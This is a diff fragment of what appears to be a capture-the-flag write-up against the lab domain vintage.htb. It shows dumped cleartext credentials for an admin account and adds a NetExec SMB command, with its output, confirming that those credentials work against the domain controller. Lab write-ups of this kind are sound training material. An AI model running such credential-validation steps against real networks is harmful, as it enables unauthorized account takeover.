@@ -360,4 +360,15 @@ Unknown     :
 Username    : vintage\c.neri_adm
 Unknown     : Uncr4ck4bl3P4ssW0rd0312
 ```
+After tryinh
+
+Ill validate these credentials
+
+```python
+nxc smb dc01.vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k                            
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
+```
+This user is now compromised
+
 
